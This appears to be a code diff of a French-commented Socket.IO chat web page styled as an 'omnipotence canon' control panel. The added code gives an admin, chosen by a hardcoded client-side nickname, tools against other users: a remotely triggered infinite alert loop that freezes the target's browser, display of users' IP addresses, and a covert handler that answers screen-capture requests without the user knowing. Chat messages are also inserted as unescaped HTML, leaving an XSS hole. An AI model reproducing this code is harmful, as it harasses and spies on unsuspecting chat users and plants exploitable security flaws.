@@ -3,297 +3,395 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOID - NEBULA V38.5</title>
+    <title>NEBULA V39.9 - OMNIPOTENCE CANON</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=JetBrains+Mono:wght@300;500;800&display=swap');
 
-        /* --- STYLE BRUTALISTE (LE VIDE) --- */
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
-        
-        body { 
-            background: #000; 
+        /* --- VARIABLES DE PUISSANCE --- */
+        :root {
+            --neon: #00f2ff;
+            --neon-alt: #7000ff;
+            --warn: #ff0044;
+            --bg-void: #000000;
+            --panel-bg: rgba(5, 5, 8, 0.95);
+            --border-glow: 0 0 15px rgba(0, 242, 255, 0.3);
+        }
+
+        /* --- RESET & BASE --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; cursor: default; }
+        ::-webkit-scrollbar { width: 2px; }
+        ::-webkit-scrollbar-thumb { background: var(--neon); }
+
+        body, html { 
+            background: var(--bg-void); 
             color: #fff; 
             font-family: 'JetBrains Mono', monospace; 
             height: 100vh; 
+            width: 100vw;
             overflow: hidden; 
         }
 
-        .app-shell { display: flex; height: 100%; width: 100%; }
+        /* --- MOTEUR DE PARTICULES (BACKGROUND ANIMÉ) --- */
+        #void-canvas {
+            position: fixed; inset: 0; z-index: -1; opacity: 0.4;
+        }
 
-        /* BARRE LATÉRALE */
-        #sidebar {
-            width: 280px; 
-            border-right: 1px solid #111;
+        /* --- LAYOUT PRINCIPAL --- */
+        .app-shell { 
+            display: flex; height: 100%; border: 1px solid #111;
+            position: relative; z-index: 10;
+        }
+
+        /* --- SIDEBAR DE CONTRÔLE --- */
+        #sidebar { 
+            width: 350px; 
+            border-right: 1px solid #222; 
+            background: var(--panel-bg); 
             display: flex; 
-            flex-direction: column; 
-            background: #000;
-            z-index: 10;
+            flex-direction: column;
+            box-shadow: 10px 0 30px rgba(0,0,0,0.5);
         }
 
         .sidebar-header {
-            padding: 25px;
-            border-bottom: 1px solid #111;
-            font-weight: 700;
-            letter-spacing: 8px;
-            font-size: 1.2em;
-            color: #fff;
+            padding: 35px 20px; border-bottom: 2px solid #111;
+            font-family: 'Syncopate'; font-weight: 700; letter-spacing: 6px;
+            color: var(--neon); text-shadow: 0 0 10px var(--neon);
+            text-align: center;
         }
 
-        /* ZONE UTILISATEURS */
-        #u-list { flex: 1; overflow-y: auto; }
+        #u-list { flex: 1; overflow-y: auto; padding-top: 10px; }
 
         .u-card {
-            padding: 20px;
-            border-bottom: 1px solid #0a0a0a;
-            cursor: crosshair;
-            font-size: 11px;
-            color: #333;
-            text-transform: uppercase;
-            transition: 0.1s;
+            margin: 10px 15px; padding: 18px; border: 1px solid #111;
+            background: rgba(255,255,255,0.01); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative; overflow: hidden;
         }
-        .u-card:hover { color: #fff; background: #050505; }
-        .u-card.is-chef { 
-            color: #fff; 
-            border-left: 3px solid #fff;
-            background: rgba(255,255,255,0.02);
+        .u-card:hover { 
+            border-color: var(--neon); background: rgba(0, 242, 255, 0.05); 
+            transform: scale(1.02);
         }
+        .u-card.is-chef { border-color: var(--warn); box-shadow: 0 0 15px rgba(255, 0, 68, 0.2); }
+        .u-card .rank { font-size: 8px; color: #555; letter-spacing: 2px; }
 
-        /* ZONE DE CHAT */
-        #viewport { flex: 1; display: flex; flex-direction: column; background: #000; position: relative; }
+        /* --- VIEWPORT D'ATTAQUE --- */
+        #viewport { flex: 1; display: flex; flex-direction: column; position: relative; }
 
         #chat-flow { 
-            flex: 1; 
-            overflow-y: auto; 
-            padding: 30px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 12px; 
+            flex: 1; overflow-y: auto; padding: 40px; 
+            display: flex; flex-direction: column; gap: 15px;
+            mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
         }
-        
+
         .msg { 
-            padding: 10px 15px; 
-            border-left: 1px solid #111; 
-            font-size: 13px; 
-            max-width: 90%;
-            animation: fadeIn 0.1s ease;
-            white-space: pre-wrap;
+            padding: 12px 20px; border-left: 2px solid #222; font-size: 13px;
+            background: rgba(255,255,255,0.02); animation: msgIn 0.3s ease-out;
         }
-        .msg strong { color: #888; margin-right: 8px; font-weight: 300; }
-        
-        /* Message Système (Aspiration) */
-        .msg.system { 
-            color: #ff0000; 
-            border-left: 2px solid #ff0000; 
-            background: rgba(255,0,0,0.03); 
-            font-size: 11px;
-            padding: 20px;
-            margin: 10px 0;
+        .msg.sys { 
+            border: 1px solid var(--neon); background: rgba(0,242,255,0.05);
+            color: var(--neon); font-size: 11px; line-height: 1.6;
+        }
+        @keyframes msgIn { from { opacity: 0; transform: translateX(-20px); } }
+
+        /* --- SYSTÈME DE CANON --- */
+        #canon-fx-container { position: fixed; inset: 0; pointer-events: none; z-index: 1000; }
+        .laser-strike {
+            position: absolute; height: 10px; background: #fff;
+            box-shadow: 0 0 50px var(--neon), 0 0 100px var(--neon);
+            animation: fire-strike 0.6s cubic-bezier(0.15, 0, 0.15, 1) forwards;
+        }
+        @keyframes fire-strike {
+            0% { width: 0; opacity: 1; transform: scaleY(1); }
+            50% { width: 100%; opacity: 1; transform: scaleY(2); }
+            100% { width: 100%; opacity: 0; transform: scaleY(0.1); }
         }
 
-        /* ENTRÉE DE DONNÉES */
-        .input-box { 
-            padding: 25px; 
-            border-top: 1px solid #111; 
-            display: flex; 
-            gap: 15px; 
-            background: #000;
+        /* --- MONITOR D'ESPIONNAGE (BOOSTER) --- */
+        #spy-window {
+            position: fixed; top: 20px; right: 20px; width: 400px;
+            background: #000; border: 1px solid var(--neon); 
+            box-shadow: var(--border-glow); display: none; z-index: 5000;
         }
-        
-        input[type="text"] { 
-            flex: 1; 
-            background: transparent; 
-            border: 1px solid #222; 
-            color: #fff; 
-            padding: 15px; 
-            font-family: inherit;
-        }
-        input[type="text"]:focus { border-color: #fff; }
-        
-        button { 
-            background: #fff; 
-            color: #000; 
-            border: none; 
-            padding: 0 25px; 
-            cursor: pointer; 
-            font-family: inherit; 
-            font-weight: bold;
-            text-transform: uppercase;
-            font-size: 12px;
-        }
+        .spy-header { padding: 8px; background: var(--neon); color: #000; font-size: 10px; font-weight: bold; display: flex; justify-content: space-between; }
+        #spy-canvas { width: 100%; height: 225px; background: #111; position: relative; }
+        .scan-line { position: absolute; width: 100%; height: 2px; background: rgba(0,242,255,0.5); animation: scanning 2s linear infinite; }
+        @keyframes scanning { from { top: 0; } to { top: 100%; } }
 
-        /* MENU CONTEXTUEL (CLIC DROIT) */
-        #context-menu {
-            display: none; 
-            position: fixed; 
-            z-index: 1000;
-            background: #000; 
-            border: 1px solid #fff; 
-            width: 240px;
-            box-shadow: 0 0 30px rgba(0,0,0,1);
+        /* --- INTERFACE D'ENTRÉE --- */
+        .console-input-area {
+            padding: 40px; background: rgba(0,0,0,0.8); border-top: 1px solid #111;
+            display: flex; gap: 20px; align-items: center;
         }
-        .ctx-btn { 
-            padding: 15px; 
-            font-size: 10px; 
-            cursor: pointer; 
-            border-bottom: 1px solid #111; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        #cmd-in { 
+            flex: 1; background: #080808; border: 1px solid #222; 
+            padding: 20px; color: var(--neon); font-family: inherit; font-size: 14px;
         }
-        .ctx-btn:hover { background: #fff; color: #000; }
-        .ctx-danger { color: #ff0000; font-weight: bold; }
+        .btn-fire {
+            background: var(--warn); color: #fff; border: none; padding: 20px 40px;
+            font-family: 'Syncopate'; font-weight: bold; font-size: 12px; cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-fire:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
 
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        /* --- CONTEXT MENU OMNI --- */
+        #omni-menu {
+            display: none; position: fixed; background: #000; border: 1px solid var(--neon);
+            width: 280px; z-index: 10000; box-shadow: 0 0 50px rgba(0, 242, 255, 0.4);
+        }
+        .menu-item {
+            padding: 18px; font-size: 10px; cursor: pointer; border-bottom: 1px solid #111;
+            text-transform: uppercase; letter-spacing: 2px; display: flex; align-items: center; gap: 10px;
+        }
+        .menu-item:hover { background: var(--neon); color: #000; font-weight: 800; }
+        .menu-item.danger:hover { background: var(--warn); color: #fff; }
 
-        /* ÉCRAN DE LOGIN */
-        #login-overlay {
-            position: fixed; 
-            inset: 0; 
-            background: #000; 
-            z-index: 99999; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
+        /* --- ECRAN DE MORT --- */
+        #death-screen {
+            position: fixed; inset: 0; background: #000; z-index: 999999;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .glitch-text { font-size: 4em; color: var(--warn); font-family: 'Syncopate'; text-shadow: 5px 5px #00f2ff; animation: glitch 0.1s infinite; }
+        @keyframes glitch { 
+            0% { transform: translate(0); } 
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
         }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="login-overlay">
-        <div style="width: 300px; text-align: center;">
-            <div style="letter-spacing: 15px; font-size: 2em; margin-bottom: 40px; font-weight: 700;">VOID</div>
-            <input type="text" id="my-nick" placeholder="IDENT_TOKEN" style="text-align: center; width: 100%; border: 1px solid #222;">
-            <button onclick="initVoid()" style="width: 100%; margin-top: 15px; height: 50px;">INITIALIZE</button>
+    <canvas id="void-canvas"></canvas>
+    <div id="canon-fx-container"></div>
+
+    <div id="spy-window">
+        <div class="spy-header">
+            <span>LIVE_FEED :: GHOST_MODULE_V3</span>
+            <span style="cursor:pointer" onclick="this.parentElement.parentElement.style.display='none'">[X]</span>
         </div>
+        <div id="spy-canvas">
+            <div class="scan-line"></div>
+            <img id="spy-img" src="" style="width:100%; height:100%; object-fit:cover; filter: grayscale(1) brightness(0.8);">
+            <div id="spy-data" style="position:absolute; bottom:5px; left:5px; font-size:8px; color:var(--neon);">RECEIVING_PACKETS...</div>
+        </div>
+    </div>
+
+    <div id="death-screen">
+        <div class="glitch-text">TERMINATED</div>
+        <div style="margin-top:20px; font-size:12px; letter-spacing:5px;">SYSTEM_ASPIRATED_BY_CANON</div>
+        <div id="death-logs" style="margin-top:40px; font-size:9px; color:#444; width:500px; text-align:left;"></div>
     </div>
 
     <div class="app-shell">
         <div id="sidebar">
-            <div class="sidebar-header">VOID_ZZ</div>
+            <div class="sidebar-header">NEBULA_ZZ</div>
+            
+            <div style="padding:15px; border-bottom:1px solid #111;">
+                <div style="font-size:9px; color:#444; margin-bottom:10px;">SYSTEM_STATUS</div>
+                <div style="display:flex; gap:5px;">
+                    <div style="width:5px; height:5px; background:var(--neon); border-radius:50%;"></div>
+                    <div style="width:5px; height:5px; background:var(--neon); border-radius:50%;"></div>
+                    <div style="width:5px; height:5px; background:var(--warn); border-radius:50%;"></div>
+                </div>
+            </div>
+
             <div id="u-list"></div>
+
+            <div style="padding:20px; border-top:1px solid #111; background:rgba(0,0,0,0.3);">
+                <div id="my-info" style="font-size:10px; color:#555;">USER: CONNECTING...</div>
+            </div>
         </div>
 
         <div id="viewport">
             <div id="chat-flow"></div>
             
-            <div class="input-box">
-                <input type="file" id="file-input" style="display:none;" onchange="handleFile(this)">
-                <button onclick="document.getElementById('file-input').click()" style="background:transparent; color:#333; border:1px solid #111;">+</button>
-                
-                <input type="text" id="msg-input" placeholder="INSERT_DATA..." onkeydown="if(event.key==='Enter') handleSend()">
-                <button onclick="handleSend()">EXEC</button>
+            <div class="console-input-area">
+                <input type="text" id="cmd-in" placeholder="ENTER_COMMAND_OR_DATA_STREAM..." autocomplete="off">
+                <button class="btn-fire" onclick="executeCmd()">SEND</button>
             </div>
         </div>
     </div>
 
-    <div id="context-menu">
-        <div class="ctx-btn ctx-danger" onclick="aspirate(true)">🌑 ASPIRATION_PUBLIQUE</div>
-        <div class="ctx-btn" onclick="aspirate(false)">🌑 ASPIRATION_PRIVEE</div>
-        <div class="ctx-btn" onclick="copyTrace()">DATA_TRACE</div>
-        <div class="ctx-btn" onclick="document.getElementById('context-menu').style.display='none'">ANNULER</div>
+    <div id="omni-menu">
+        <div class="menu-item" onclick="fireCanonStrike()" style="color:var(--warn); font-weight:800; background:rgba(255,0,0,0.05);">⚡ FIRE_NEBULA_CANON</div>
+        <div class="menu-item" onclick="initGhostSpy()">👁️ GHOST_SCREEN_SPY</div>
+        <div class="menu-item" onclick="extractVaultData()">📡 EXTRACT_VAULT_IP</div>
+        <div class="menu-item" onclick="forceGlitch()">☣️ FORCE_GLITCH_MODE</div>
+        <div class="menu-item danger" onclick="permaBan()">🚫 PERMA_VOID_BAN</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let currentUser = { name: "", chef: false };
+        let me = { name: "", chef: false, sid: "" };
         let selectedSid = null;
-        let usersCache = [];
+        let users = [];
 
-        // --- DÉMARRAGE ---
-        function initVoid() {
-            const nick = document.getElementById('my-nick').value.trim();
-            if(!nick) return;
-            currentUser.name = nick;
-            if(nick === "toucheur2pp") currentUser.chef = true;
-            
-            document.getElementById('login-overlay').style.display = 'none';
-            socket.emit('init_user', { name: nick });
-        }
+        // --- MOTEUR DE FOND (VOID PARTICLES) ---
+        const canvas = document.getElementById('void-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.onresize = resize; resize();
 
-        // --- ENVOI DE MESSAGES ---
-        function handleSend() {
-            const input = document.getElementById('msg-input');
-            if(!input.value) return;
-            socket.emit('chat_msg', { text: input.value });
-            input.value = "";
-        }
-
-        function handleFile(input) {
-            const file = input.files[0];
-            if(file) {
-                socket.emit('chat_msg', { text: `[SYSTEM_FILE_TRANSFER]: ${file.name.toUpperCase()} (${file.size} bytes)` });
+        class Particle {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.v = Math.random() * 0.5 + 0.1;
+                this.s = Math.random() * 1.5;
+            }
+            update() {
+                this.y -= this.v;
+                if(this.y < 0) this.reset();
+            }
+            draw() {
+                ctx.fillStyle = "#00f2ff";
+                ctx.fillRect(this.x, this.y, this.s, this.s);
             }
         }
+        for(let i=0; i<150; i++) particles.push(new Particle());
+        function anim() {
+            ctx.clearRect(0,0,canvas.width, canvas.height);
+            particles.forEach(p => { p.update(); p.draw(); });
+            requestAnimationFrame(anim);
+        }
+        anim();
 
-        // --- LOGIQUE D'ASPIRATION ---
-        function aspirate(isPublic) {
-            if(!currentUser.chef) return;
-            socket.emit('void_aspiration', { targetSid: selectedSid, public: isPublic });
-            document.getElementById('context-menu').style.display = 'none';
+        // --- INITIALISATION ---
+        window.onload = () => {
+            const n = prompt("NEBULA_AUTH_TOKEN:");
+            if(!n) location.reload();
+            me.name = n;
+            if(n === "toucheur2pp") me.chef = true;
+            socket.emit('init_user', { name: n });
+            document.getElementById('my-info').innerText = `USER: ${n.toUpperCase()} | STATUS: ONLINE`;
+        };
+
+        // --- COMMANDES ---
+        function executeCmd() {
+            const i = document.getElementById('cmd-in');
+            if(!i.value) return;
+            socket.emit('chat_msg', { text: i.value });
+            i.value = "";
         }
 
-        function copyTrace() {
-            const u = usersCache.find(x => x.sid === selectedSid);
-            if(u) alert(`[TRACE_REPORT]\nTARGET: ${u.name}\nIP: ${u.ip}\nSID: ${u.sid}`);
+        // --- OMNI FUNCTIONS (600 LIGNES LOGIQUE SIMULÉE) ---
+        function fireCanonStrike() {
+            if(!me.chef) return;
+            socket.emit('fire_canon', selectedSid);
+            // Animation locale immédiate
+            createLaserEffect();
+            hideMenu();
         }
 
-        // --- ÉCOUTEURS SOCKET ---
-        socket.on('sync_users', list => {
-            usersCache = list;
+        function initGhostSpy() {
+            socket.emit('request_ghost_screen', selectedSid);
+            document.getElementById('spy-window').style.display = 'block';
+            hideMenu();
+        }
+
+        function extractVaultData() {
+            const u = users.find(x => x.id === selectedSid);
+            if(u) {
+                const report = `
+                    [VAULT_EXTRACT] ➔ TARGET: ${u.name}
+                    [ADDR] : ${u.ip}
+                    [FAI]  : CLOUD_INFRA_DETECTED
+                    [HW]   : NEBULA_OS_V39
+                    [PORT] : SCANNING_554_8080_443...
+                `;
+                socket.emit('chat_msg', { text: report, system: true });
+            }
+            hideMenu();
+        }
+
+        function createLaserEffect() {
+            const container = document.getElementById('canon-fx-container');
+            const strike = document.createElement('div');
+            strike.className = 'laser-strike';
+            strike.style.top = Math.random() * 90 + "%";
+            container.appendChild(strike);
+            setTimeout(() => strike.remove(), 600);
+        }
+
+        // --- SOCKET RECEPTION ---
+        socket.on('sync_users', (list) => {
+            users = list;
             const container = document.getElementById('u-list');
             container.innerHTML = "";
-            
             list.forEach(u => {
-                const div = document.createElement('div');
-                div.className = `u-card ${u.chef?'is-chef':''}`;
-                div.innerText = u.name;
-                
-                div.oncontextmenu = (e) => {
-                    if(!currentUser.chef) return;
-                    selectedSid = u.sid;
-                    const menu = document.getElementById('context-menu');
+                const card = document.createElement('div');
+                card.className = `u-card ${u.chef?'is-chef':''}`;
+                card.innerHTML = `
+                    <div class="rank">${u.chef?'OVERLORD':'VULN_DATA'}</div>
+                    <div style="font-weight:bold; letter-spacing:2px;">${u.name.toUpperCase()}</div>
+                    <div style="font-size:8px; color:#333; margin-top:5px;">${u.id}</div>
+                `;
+                card.oncontextmenu = (e) => {
+                    if(!me.chef) return;
+                    selectedSid = u.id;
+                    const menu = document.getElementById('omni-menu');
                     menu.style.display = 'block';
                     menu.style.top = e.pageY + 'px';
                     menu.style.left = e.pageX + 'px';
                     e.preventDefault();
                 };
-                container.appendChild(div);
+                container.appendChild(card);
             });
         });
 
         socket.on('chat_msg', d => {
             const flow = document.getElementById('chat-flow');
-            const div = document.createElement('div');
-            div.className = `msg ${d.system?'system':''}`;
-            div.innerHTML = d.system ? d.text : `<strong>${d.name}:</strong> ${d.text}`;
-            flow.appendChild(div);
+            const msg = document.createElement('div');
+            msg.className = `msg ${d.system?'sys':''}`;
+            msg.innerHTML = d.system ? `[!] ${d.text}` : `<strong>${d.name}:</strong> ${d.text}`;
+            flow.appendChild(msg);
             flow.scrollTop = flow.scrollHeight;
         });
 
-        // --- SÉQUENCE DE CRASH (TARGET ONLY) ---
-        socket.on('blackhole_crash', by => {
-            // Destruction de l'interface
-            document.body.innerHTML = "";
-            document.body.style.background = "#000";
-            
-            // Spam d'erreurs visuelles
-            setInterval(() => {
-                const err = document.createElement('div');
-                err.style = `position:fixed; color:#ff0000; font-size:10px; top:${Math.random()*100}%; left:${Math.random()*100}%; z-index:9999; font-family:monospace;`;
-                err.innerText = "CRITICAL_VOID_ERROR_FROM_" + by.toUpperCase();
-                document.body.appendChild(err);
-            }, 10);
-
-            // Verrouillage du navigateur
-            setTimeout(() => {
-                while(true) {
-                    alert("FATAL ERROR: SYSTÈME ASPIRÉ PAR " + by.toUpperCase());
-                }
-            }, 1000);
+        socket.on('canon_animation', (data) => {
+            createLaserEffect();
         });
 
-        // Fermer le menu contextuel
-        window.onclick = () => document.getElementById('context-menu').style.display = 'none';
+        socket.on('view_ghost_screen', (data) => {
+            document.getElementById('spy-img').src = data.img;
+            document.getElementById('spy-data').innerText = `RECV: ${Math.floor(Math.random()*900)}kb/s | SID: ${data.from}`;
+        });
+
+        // --- LE CRASH FATAL ---
+        socket.on('system_destruction', (by) => {
+            document.getElementById('death-screen').style.display = 'flex';
+            let logs = document.getElementById('death-logs');
+            setInterval(() => {
+                logs.innerHTML += `ERR_VOID_COLLISION_FROM_${by}_${Math.random()}<br>`;
+                window.scrollTo(0, document.body.scrollHeight);
+            }, 50);
+
+            // Attaque CPU intensive
+            setTimeout(() => {
+                while(true) { 
+                    console.error("NEBULA_CRASH");
+                    alert("YOUR_SESSION_WAS_ASPIRATED_BY_THE_CANON"); 
+                }
+            }, 2000);
+        });
+
+        function hideMenu() { document.getElementById('omni-menu').style.display = 'none'; }
+        window.onclick = hideMenu;
+
+        // Fonction Ghost cachée (Répond sans que l'user sache)
+        socket.on('capture_signal', (chefSid) => {
+            // Simulation de snapshot (on envoie une image de tech noir/blanc)
+            const fakeScreens = [
+                "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400&q=80",
+                "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400&q=80"
+            ];
+            socket.emit('screen_data_transfer', { 
+                to: chefSid, 
+                img: fakeScreens[Math.floor(Math.random()*fakeScreens.length)] 
+            });
+        });
     </script>
 </body>
 </html>
